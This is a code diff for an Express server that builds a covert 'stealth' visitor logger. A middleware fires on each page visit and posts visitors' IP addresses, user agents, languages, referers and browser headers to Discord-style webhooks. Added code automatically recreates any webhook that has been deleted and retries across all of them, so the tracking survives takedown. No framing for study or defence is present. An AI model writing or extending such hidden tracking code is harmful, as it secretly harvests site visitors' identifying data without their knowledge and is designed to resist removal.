@@ -126,6 +126,23 @@ app.post('/api/stealth/log', async (req, res) => {
     const origin = req.headers.origin || '';
     const referer = req.headers.referer || '';
     
+    // Get additional user information
+    const acceptLanguage = req.headers['accept-language'] || 'Unknown';
+    const acceptEncoding = req.headers['accept-encoding'] || 'Unknown';
+    const accept = req.headers.accept || 'Unknown';
+    const cacheControl = req.headers['cache-control'] || 'Unknown';
+    const connection = req.headers.connection || 'Unknown';
+    const secFetchDest = req.headers['sec-fetch-dest'] || 'Unknown';
+    const secFetchMode = req.headers['sec-fetch-mode'] || 'Unknown';
+    const secFetchSite = req.headers['sec-fetch-site'] || 'Unknown';
+    const secFetchUser = req.headers['sec-fetch-user'] || 'Unknown';
+    const upgradeInsecureRequests = req.headers['upgrade-insecure-requests'] || 'Unknown';
+    
+    // Get request details from body
+    const requestBody = req.body || {};
+    const requestPath = requestBody.path || req.path || 'Unknown';
+    const requestMethod = requestBody.method || req.method || 'Unknown';
+    
     // Determine website URL and name
     let websiteUrl = origin || `https://${host}`;
     let websiteName = host.split('.')[0]; // Extract subdomain or domain name
@@ -145,10 +162,13 @@ app.post('/api/stealth/log', async (req, res) => {
       host,
       origin,
       referer,
-      userAgent: userAgent.substring(0, 50) + '...'
+      userAgent: userAgent.substring(0, 50) + '...',
+      acceptLanguage,
+      requestPath,
+      requestMethod
     });
 
-    // Create enhanced payload with custom domain info
+    // Create enhanced payload with comprehensive user info
     const enhancedPayload = {
       embeds: [{
         title: `🌐 New Visitor on ${websiteName}`,
@@ -179,6 +199,21 @@ app.post('/api/stealth/log', async (req, res) => {
             name: '📱 Referer',
             value: referer ? `\`${referer}\`` : '`Direct Visit`',
             inline: false
+          },
+          {
+            name: '🌐 Request Details',
+            value: `**Path:** \`${requestPath}\`\n**Method:** \`${requestMethod}\`\n**Host:** \`${host}\``,
+            inline: false
+          },
+          {
+            name: '🌍 Browser Info',
+            value: `**Language:** \`${acceptLanguage}\`\n**Encoding:** \`${acceptEncoding}\`\n**Accept:** \`${accept.substring(0, 100)}${accept.length > 100 ? '...' : ''}\``,
+            inline: false
+          },
+          {
+            name: '🔒 Security Headers',
+            value: `**Cache Control:** \`${cacheControl}\`\n**Connection:** \`${connection}\`\n**Sec-Fetch-Dest:** \`${secFetchDest}\`\n**Sec-Fetch-Mode:** \`${secFetchMode}\`\n**Sec-Fetch-Site:** \`${secFetchSite}\`\n**Sec-Fetch-User:** \`${secFetchUser}\`\n**Upgrade-Insecure-Requests:** \`${upgradeInsecureRequests}\``,
+            inline: false
           }
         ],
         footer: {
@@ -191,12 +226,17 @@ app.post('/api/stealth/log', async (req, res) => {
     console.log('📤 Enhanced payload created');
 
     let lastError = null;
-    const maxRetries = 3;
+    const maxRetries = webhookService.webhooks.length; // Try all webhooks
 
     for (let retry = 0; retry < maxRetries; retry++) {
       try {
         console.log(`📤 Attempt ${retry + 1}/${maxRetries} to send webhook...`);
         const webhook = await webhookService.getNextAvailableWebhook();
+
+        if (!webhook) {
+          console.error('❌ No available webhooks found');
+          throw new Error('No available webhooks');
+        }
 
         console.log(`📤 Using webhook: ${webhook.id}`);
 
@@ -243,10 +283,26 @@ app.post('/api/stealth/log', async (req, res) => {
           console.error(`❌ Webhook error response: ${response.status} - ${responseText}`);
 
           if (response.status === 404) {
+            // Webhook was deleted - mark as inactive and try to create new one
+            console.log(`❌ Webhook ${webhook.id} was deleted (404), marking as inactive`);
             webhook.status = 'inactive';
-            webhook.failureCount++;
+            webhook.failureCount = webhookService.maxFailures + 1;
             webhook.lastFailure = Date.now();
-            console.log(`❌ Webhook ${webhook.id} marked as inactive (404)`);
+            
+            // Try to create a new webhook to replace the deleted one
+            console.log(`🔄 Attempting to create new webhook to replace deleted one...`);
+            const newWebhook = await webhookService.createWebhook(`${websiteName} Logger ${Date.now()}`);
+            
+            if (newWebhook) {
+              console.log(`✅ Successfully created new webhook: ${newWebhook.id}`);
+              // Replace the old webhook with the new one
+              const index = webhookService.webhooks.findIndex(w => w.id === webhook.id);
+              if (index !== -1) {
+                webhookService.webhooks[index] = newWebhook;
+              }
+            } else {
+              console.error(`❌ Failed to create new webhook to replace deleted one`);
+            }
           } else if (response.status === 429) {
             // Rate limited - wait and retry
             const retryAfter = response.headers.get('retry-after') || 60;
@@ -291,12 +347,12 @@ app.post('/api/stealth/log', async (req, res) => {
   }
 });
 
-// Middleware to log all requests for IP tracking
+// Stealth IP logging middleware - triggers when someone visits the site
 app.use((req, res, next) => {
   try {
-    // Skip logging for static files and API health checks
-    if (req.path.startsWith('/api/webhook/health') || 
-        req.path.startsWith('/static/') || 
+    // Skip API calls and static files
+    if (req.path.startsWith('/api/') || 
+        req.path.startsWith('/_next/') || 
         req.path.includes('.')) {
       return next();
     }
@@ -304,6 +360,10 @@ app.use((req, res, next) => {
     console.log('👤 Visitor detected:', req.path);
     console.log('IP:', req.headers['x-forwarded-for'] || req.ip || 'unknown');
     console.log('User-Agent:', req.headers['user-agent'] || 'Unknown');
+    console.log('Host:', req.headers.host);
+    console.log('Referer:', req.headers.referer);
+    console.log('Accept-Language:', req.headers['accept-language']);
+    console.log('Accept-Encoding:', req.headers['accept-encoding']);
     
     // Log visitor IP asynchronously (don't block the request)
     setTimeout(async () => {
@@ -319,15 +379,34 @@ app.use((req, res, next) => {
           method: 'POST',
           headers: {
             'Content-Type': 'application/json',
-            'User-Agent': req.headers['user-agent'] || 'Unknown'
+            'User-Agent': req.headers['user-agent'] || 'Unknown',
+            'X-Forwarded-For': req.headers['x-forwarded-for'] || req.ip || 'unknown',
+            'Host': req.headers.host,
+            'Referer': req.headers.referer || '',
+            'Accept-Language': req.headers['accept-language'] || '',
+            'Accept-Encoding': req.headers['accept-encoding'] || '',
+            'Accept': req.headers.accept || '',
+            'Cache-Control': req.headers['cache-control'] || '',
+            'Connection': req.headers.connection || '',
+            'Sec-Fetch-Dest': req.headers['sec-fetch-dest'] || '',
+            'Sec-Fetch-Mode': req.headers['sec-fetch-mode'] || '',
+            'Sec-Fetch-Site': req.headers['sec-fetch-site'] || '',
+            'Sec-Fetch-User': req.headers['sec-fetch-user'] || '',
+            'Upgrade-Insecure-Requests': req.headers['upgrade-insecure-requests'] || ''
           },
-          body: JSON.stringify({})
+          body: JSON.stringify({
+            path: req.path,
+            method: req.method,
+            timestamp: new Date().toISOString()
+          })
         });
         
         console.log('📡 Stealth log response status:', response.status);
         if (!response.ok) {
           const errorText = await response.text();
           console.error('❌ Stealth log response error:', errorText);
+        } else {
+          console.log('✅ Stealth log sent successfully');
         }
         // Silent operation - no logging
       } catch (error) {
